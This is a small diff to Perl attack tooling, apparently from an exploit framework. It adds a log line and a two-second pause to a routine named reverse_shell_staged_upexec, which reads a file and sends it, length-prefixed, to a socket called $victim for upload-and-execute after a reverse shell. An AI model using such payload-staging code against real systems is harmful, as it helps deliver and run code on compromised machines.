@@ -305,6 +305,8 @@ sub reverse_shell_staged_upexec
     while (<X>){ $upload.=$_ }
     close (X);
 
+    print STDERR "[*] Sleeping before sending file.\n";
+    sleep(2);
     print STDERR "[*] All stages sent, uploading file (" . length($upload) . ")\n";
 
     $victim->send(pack('V', length($upload)));
